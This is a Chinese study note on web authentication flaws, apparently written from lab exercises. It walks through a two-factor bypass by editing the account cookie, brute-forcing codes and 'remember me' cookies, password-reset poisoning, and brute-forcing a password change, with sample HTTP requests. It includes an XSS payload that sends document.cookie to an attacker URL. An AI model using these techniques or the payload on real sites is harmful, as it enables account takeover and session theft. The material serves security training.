身份验证进阶

1. 双重身份验证的绕过（即2FA）

  • 应用条件，当输入验证码之后，迅速重新登录
  • 有些网站实际上并不会检查是否完成了第二步验证码的检测。

1.1 缺陷的双重身份验证逻辑

例：登录之后还需要输入验证码，验证码来自邮箱。

先使用自己的账户登录

POST /login-steps/first HTTP/1.1
Host: vulnerable-website.com
...
username=carlos&password=qwerty

然后，将为他们分配与他们的帐户相关的cookie，将其转到登录过程的第二步

HTTP/1.1 200 OK
Set-Cookie: account=carlos

GET /login-steps/second HTTP/1.1
Cookie: account=carlos
  • 接着，从邮箱获取code，并登录
POST /login-steps/second HTTP/1.1
Host: vulnerable-website.com
Cookie: account=carlos
...
verification-code=123456

在这种情况下，攻击者可以使用自己的凭据登录，然后在提交验证码时将帐户cookie的值更改为任意用户名。

POST /login-steps/second HTTP/1.1
Host: vulnerable-website.com
Cookie: account=victim-user  # 关键点就是这，如果这里是加密的就好了
...
verification-code=$123456$    # 对验证码进行爆破

爆破使用brute forcer进行爆破

2.其他身份验证机制中的漏洞

2.1 “记住密码”

记住密码这一举动往往会得到一个存储的cookie，通过这个cookie进行爆破

  • 首先使用正确的username与password登录之后，进行记住密码
  • 那么就会得到一个cookie，再使用受害者的账号进行爆破

更为重要的是，留意cookie的加密方式（如base64等）

2.1a “记住密码”——-> 利用xss窃取cookie

所用的payload

  • 先确定是否存在xss
<img src=1 onerror=alert(1) />
  • 再获取cookie
<script>document.location='所要盗取cookie的
url'+document.cookie</script>

一般来说要尝试破解cookie的加密方式

例如password——->md5——–>base64——>cookie

2.2 重置用户密码

2.2A 通过电子邮箱发送密码

  • 所用方法
    • 先用正确的账号密码登录，并选择忘记密码，抓到如下一个包

将username修改成victim name即可

2.2B 密码重置中毒

相比2.2A 通过电子邮箱发送密码，通过点击网址来重置密码是安全性更高的方式。

  • 通过伪造XFH的方式，来进行攻击

伪造XFH的目的是获取victim的forgot-password-token

2.3 爆破式修改用户密码

  • 通过重新设置密码界面，由于只有一个未知量当前密码
  • 故对当前密码进行爆破，使用正确账号登录的cookie
